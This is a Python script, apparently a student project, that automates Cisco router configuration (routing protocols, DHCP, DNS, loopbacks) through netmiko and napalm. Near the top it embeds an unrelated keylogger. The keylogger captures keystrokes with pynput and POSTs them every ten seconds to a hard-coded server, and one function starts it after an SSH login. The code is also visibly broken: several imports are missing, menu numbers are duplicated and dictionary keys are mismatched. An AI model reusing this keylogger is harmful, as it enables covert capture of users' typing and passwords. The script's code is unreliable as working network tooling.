from netmiko import ConnectHandler
from netmiko.ssh_exception import NetMikoTimeoutException, AuthenticationException
from napalm import get_network_driver
import getpass

#----------------------------------keylogger------------------------------------#

# We make a global variable text where we'll save a string of the keystrokes which we'll send to the server.
text = ""

# Hard code the values of your server and IP address here.
ip_address = "localhost"
port_number = "8080"
# Time interval in seconds for code to execute.
time_interval = 10

def send_post_req():
    try:
        # We need to convert the Python object into a JSON string so that we can POST it to the server.
        # The server expects JSON in the format {"keyboardData" : "<value_of_text>"}
        payload = json.dumps({"keyboardData" : text})
        # We send the POST request to the server with the specified IP address and port.
        # We specify that the MIME Type for JSON is application/json.
        r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type" : "application/json"})
        # Setting up a timer function to run every <time_interval> seconds.
        # send_post_req is a recursive function and will call itself as long as the program is running.
        timer = threading.Timer(time_interval, send_post_req)
        # We start the timer thread.
        timer.start()
    except:
        print("Couldn't complete request!")

# We only need to log the key once it is released. That way it takes the modifier keys into consideration.
def on_press(key):
    global text

    # Based on the key press, we handle the way the key gets logged to the in-memory string.
    # Read more on the different keys that can be logged here:
    # https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        # We do an explicit conversion from the key object to a string and then append that to the string held in memory.
        text += str(key).strip("'")
    #---------------------------------------ssh-connection-----------------------------------------------#
def ssh_connection(ip_address,username,password):
    iosv_l2 = {
        'device_type': 'cisco_ios',
        'ip': ip_address,
        'username': username,
        'password': password,
    }
    try:
        connection = ConnectHandler(**iosv_l2)
    except AuthenticationException:
        print('Authentication failure: ' + ip_address)
    except NetMikoTimeoutException:
        print('Timeout to device: ' + ip_address)
    except EOFError:
        print('End of file while attempting device: ' + ip_address)
    except SSHException:
        print('Be sure that SSH is enabled in: ' + ip_address + '?')
    except Exception as unknown_error:
        print('Some other error: ' + str(unknown_error))
    return connection


    #-----------------------------------enable_keylogger---------------------------------------------#
def enable_keylog(username,password):

# Start the SSH connection
   connection = ssh_connection(ip_address,username,password)

   if connection:
    # Start the keyboard listener in a separate thread
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    # Start sending the POST requests to the server
    send_post_req()

    # Joining the listener thread, which will run as long as the program is running.
    listener.join()
       #-----------DATA INFORMATION ABOUT ROUTER--------------#
def data_device(ip,username,password):
    devices = [ip]

    driver = get_network_driver('ios')

    for device in devices:
        try:
            iou1 = driver(device, username, password)
            iou1.open()

            facts = iou1.get_facts()
            print(json.dumps(facts, indent=4))

            interfaces = iou1.get_interfaces()
            print(json.dumps(interfaces, sort_keys=True, indent=4))

            interfaces_counters = iou1.get_interfaces_counters()
            print(json.dumps(interfaces_counters, indent=4))

            interfaces_ip = iou1.get_interfaces_ip()
            print(json.dumps(interfaces_ip, indent=4))
            
            device_type = facts.get('model', '')
            if 'router' in device_type.lower():
                routing_table = iou1.get_route_to(destination='', protocol='')
                print(json.dumps(routing_table, indent=4))
            lldp_neighbors = iou1.get_lldp_neighbors()
            print(json.dumps(lldp_neighbors, indent=4))

            iou1.close()
        
        except Exception as e:
            print(f"Une erreur s'est produite lors de la récupération des informations du périphérique {device}:")
            print(str(e))

       #----------------------------LOOPBACK Configuration---------------------------------#
def construct_LOOPBACKLIST():
    router_graph = {}
   
    ask = 'y'
    while ask == 'y':
        ip = input('\nEnter the IP address of the device: ')
        name = input('Enter the hostname: ')

        LOOPBACK = input('Enter the LOOPBACK: ')
       
        router_graph[name] = {'ip': ip, 'LOOPBACK': LOOPBACK}
        ask = input("\nDo you want to add more devices? Answer with 'y' or 'n': ").lower()

    return router_graph

def LOOPBACK_CONFIGURATION(L,username,password):
    for name, details in L.items():  # Utilisez items() pour itérer sur les noms et les détails.
        router = ssh_connection(details['ip'],username,password)  # Utilisez l'adresse IP du détail du dispositif.
        config_commands = [
            "interface Loopback0",  # Utilisez "Loopback0" au lieu de "l0".
            f"ip address {details['loopback']} 255.255.255.255"
        ]

    output = router.send_config_set(config_commands)
    print(output)



#------------------------------STATIC ROUTE-----------------------------------------#
def construct_router_graphS():
    router_graph = {}
   
    ask = 'y'
    while ask == 'y':
        ip = input('\nEnter the IP address of the device: ')
        name = input('Enter the hostname: ')

        next_hop = input('Enter the IP address of the next hop: ')
        destination = input('\nEnter the IP address Destination: ')
        subnetmask = input('\nEnter the subnet mask: ')

        router_graph[name] = {'ip': ip, 'next_hop': next_hop, 'destination': destination,'subnet mask':subnetmask}
        ask = input("\nDo you want to add more devices? Answer with 'y' or 'n': ").lower()

    return router_graph
def staticRoute(ip_address_device, network_to_reach, next_hop, subnetMask,username,password):
    connection = ssh_connection(ip_address_device,username,password)
    config_commands = [f'ip route {network_to_reach} {subnetMask} {next_hop}']
    output = connection.send_config_set(config_commands)
    # If you want to retrieve the output of the executed command, you can do it here.
    print(output)
#------------------------------RIP configuration-----------------------------------------#
def construct_router_graphRIP():
    router_graph = {}

    ask = 'y'
    while ask == 'y':
        ip = input('\nEnter the IP address of the device: ')
        name = input('Enter the hostname: ')

        neighbors = input('Enter the IP addresses of neighboring routers separated by commas (e.g., 192.168.23.0,192.168.13.0): ')
        neighbor_list = [neighbor.strip() for neighbor in neighbors.split(',')]

        router_graph[name] = {'ip': ip, 'neighbors': neighbor_list}
        ask = input("\nDo you want to add more devices? Answer with 'y' or 'n': ").lower()

    return router_graph


def configure_rip(ip_address_device, L,username,password):
    router = ssh_connection(ip_address_device,username,password)  # Assuming you have implemented ssh_connection() to establish an SSH connection.
    config_commands = [
        "router rip",
         "version 2",  # Replace 1 with your desired RIP process number
        "no auto-summary"
    ]
    for i in range(len(L)):
        config_commands.append(f"network {L[i]}")
    
    output = router.send_config_set(config_commands)
    print(output)



#-----------------------EIGRP CONFIGURATION---------------------------#
def configure_eigrp_all_interfaces(ip_address_device,n,username,password):
    router = ssh_connection(ip_address_device,username,password)
    config_commands = [
       f"router eigrp {n}",  # Remplacez 1 par votre num      ro de processus EIGRP souhait
        "network 0.0.0.0 255.255.255.255"
    ]
    output = router.send_config_set(config_commands)
    print(output)
    print("EIGRP activ       sur toutes les interfaces.")

def construct_router_graphEIGRP_OSPF():
    router_graph = {}

    ask = 'y'
    while ask == 'y':
        ip = input('\nEnter the IP address of the device: ')
        name = input('Enter the hostname: ')
        Loopback=input('\nEnter the Loopback of the device: ')
        neighbors = input('Enter the IP addresses of neighboring routers separated by commas (e.g., 192.168.23.0,192.168.13.0): ')
        neighbor_list = [neighbor.strip() for neighbor in neighbors.split(',')]
        wildMask = input('Enter the WildMask separated by commas (e.g., 0.0.0.3,0.0.0.5): ')
        wild_list = [neighbor.strip() for neighbor in wildMask.split(',')]

        router_graph[name] = {'ip': ip, 'neighbors': neighbor_list,'wildMask':wild_list,'loopback':Loopback}
        ask = input("\nDo you want to add more devices? Answer with 'y' or 'n': ").lower()

    return router_graph


def configure_eigrp(ip_address_device, L,A,n,username,password):
    router = ssh_connection(ip_address_device,username,password)  # Assuming you have implemented ssh_connection() to establish an SSH connection.
    config_commands = [
        f"router eigrp {n}",
          # Replace 1 with your desired RIP process number
        "no auto-summary"
    ]
    for i in range(len(L)):
        config_commands.append(f"network {L[i]} {A[i]}")
    
    output = router.send_config_set(config_commands)
    print(output)

#----------------------------OSPFV2 configuration----------------------------------#
def list_of_area():
    router_graph = {}
   
    ask = 'y'
    while ask == 'y':
    
        name = int(input('Enter the numero of area : '))

        ip_add = input('Enter the IP addresses of routers in same  separated by commas (e.g., 192.168.23.0,192.168.13.0): ')
        


        router_graph[ip_add] =name
        ask = input("\nDo you want to add more devices? Answer with 'y' or 'n': ").lower()

    return router_graph
def configure_OSPF(ip_address_device, loopback,process_number, L, A,username,password):
    router = ssh_connection(ip_address_device,username,password)
    

    config_commands = [
        f"router ospf {process_number}",
        f"network {loopback} 0.0.0.0 area 0"
    ]
    
    for i in range(len(L)):
        config_commands.append(f"network {L[i]} {A[i]} area 0 ")
    
    output = router.send_config_set(config_commands)
    print(output)

#--------------------------DHCP Configuration----------------------------------------#
def dhcp_configuration(ip_address_device,low_address,high_address,poolname,ip_add,length,ipAdd,domainName,hop_address_dhcp,username,password):
    router = ssh_connection(ip_address_device,username,password)
    choice = input('Do you want to be? (server,client,relay agent): ').lower()
    if choice=='server':
          config_commands = [
              f"ip dhcp excluded-address {low_address} {high_address}",
              f"ip dhcp pool  {poolname}",
              f"network {ip_add} {length}",
              f"default-router {ip_address_device}",
              f"dns-server {ipAdd}",
              f"domain-name {domainName}"


]
    if choice=='relay agent':
         config_commands=[
             f'ip helper-address {hop_address_dhcp}'
         ]
    if choice=='client':
     config_commands=[
             'ip address dhcp'
         ]

    
    
    
    output = router.send_config_set(config_commands)
    print(output)



#---------------------------------DNS CONFIGURATION--------------------------------------------#
def list_of_host():
    dns = {}
   
    ask = 'y'
    while ask == 'y':
    
        name = int(input('Enter the numero of area : '))

        ip_add = input('Enter the IP addresses of routers in same  separated by commas (e.g., 192.168.23.0,192.168.13.0): ')
        


        dns[ip_add] =name
        ask = input("\nDo you want to add more devices? Answer with 'y' or 'n': ").lower()

    return dns
def dns_configuration(ip_add_device,ip_add_server,domainName,hostname,ip_add,username,password):
    router = ssh_connection(ip_address_device,username,password)
    config_commands=[
             'ip dns server',
             f'ip host {hostname} {ip_add}',
             f'ip name-server {ip_add_server}',
             'ip domain lookup',
             f'ip domain name {domainName}'             
         ]
    output = router.send_config_set(config_commands)
    print(output)
#-------------------------NTP configuration ------------------------------------#
    

         
    



if __name__ == "__main__":
    while True:
        print("\n========== Router Configuration Menu ==========")
        print("1. Static Routing Configuration")
        print("2. RIP Configuration")
        print("3. EIGRP Configuration")
        print("4. OSPF Configuration")
        print("5. DHCP Configuration")
        print("6. DNS Configuration")
        print("7. Loopback Configuration") 
        print("9. DATA INFORMATION")
        print("9. Exit")
        print("===============================================")

        choice = input("Enter the number of your choice: ")
        username = input("Enter the username: ")
        password=getpass.getpass('Enter the password: ')

        if choice == "1":
            # Static Routing Configuration
            router_graph = construct_router_graphS()
            for router_info in router_graph.values():
                destination = router_info['destination']
                subnetmask = router_info['subnet mask']
                ip_address = router_info['ip']
                next_hop = router_info['next_hop']
                staticRoute(ip_address, destination, next_hop, subnetmask,username,password)

        elif choice == "2":
            # RIP Configuration
            router_graph = construct_router_graphRIP()
            for router_info in router_graph.values():
                ip_address = router_info['ip']
                neighbors = router_info['neighbors']
                configure_rip(ip_address, neighbors,username,password)

        elif choice == "3":
            # EIGRP Configuration
            eigrp_choice = input("Do you want to configure all interfaces on EIGRP? (yes/no): ").lower()
            if eigrp_choice == 'no':
                ip_address_device = input('\nEnter the IP address of the device: ')
                n = int(input('Enter the number of AS: '))
                configure_eigrp_all_interfaces(ip_address_device, n,username,password)
            elif eigrp_choice == 'yes':
                router_graph = construct_router_graphEIGRP_OSPF()
                n = int(input('Enter the number of AS: '))
                for router_info in router_graph.values():
                    ip_address = router_info['ip']
                    neighbors = router_info['neighbors']
                    wildMask = router_info['wildMask']
                    configure_eigrp(ip_address, neighbors, wildMask, n,username,password)
            else:
                print("Invalid choice.")

        elif choice == "4":
            # OSPF Configuration
            router_graph = construct_router_graphEIGRP_OSPF()
            process_number = int(input('\nEnter the number of AS: '))
            for router_info in router_graph.values():
                ip_address = router_info['ip']
                neighbors = router_info['neighbors']
                wildMask = router_info['wildMask']
                loopback = router_info['loopback']
                configure_OSPF(ip_address, loopback, process_number, neighbors, wildMask,username,password)

        elif choice == "5":
            # DHCP Configuration
            ip_address_device = input('\nEnter the IP address of the device: ')
            low_address = input('Enter the low address for DHCP pool: ')
            high_address = input('Enter the high address for DHCP pool: ')
            poolname = input('Enter the DHCP pool name: ')
            ip_add = input('Enter the IP address for default-router: ')
            length = input('Enter the subnet mask length: ')
            ipAdd = input('Enter the IP address for DNS server: ')
            domainName = input('Enter the domain name: ')
            hop_address_dhcp = input('Enter the IP address for DHCP relay agent (if applicable): ')
            dhcp_configuration(ip_address_device, low_address, high_address, poolname, ip_add, length, ipAdd, domainName, hop_address_dhcp,username,password)

        elif choice == "6":
            # DNS Configuration
            ip_address_device = input('\nEnter the IP address of the device: ')
            ip_add_server = input('Enter the IP address of DNS server: ')
            domainName = input('Enter the domain name: ')
            hostname = input('Enter the hostname: ')
            ip_add = input('Enter the IP address for the hostname: ')
            dns_configuration(ip_address_device, ip_add_server, domainName, hostname, ip_add,username,password)
        
        elif choice == "7":
            # Loopback Configuration
            loopback_list = construct_LOOPBACKLIST()
            LOOPBACK_CONFIGURATION(loopback_list,username,password)
        elif choice == "8":
             ip_address = input("Enter the IP address: ")
             data_device(ip_address,username,password)
            
        
        elif choice == "9":
            # Exit the program
            print("Exiting the program.")
            break

        else:
            print("Invalid choice. Please choose a valid option.")
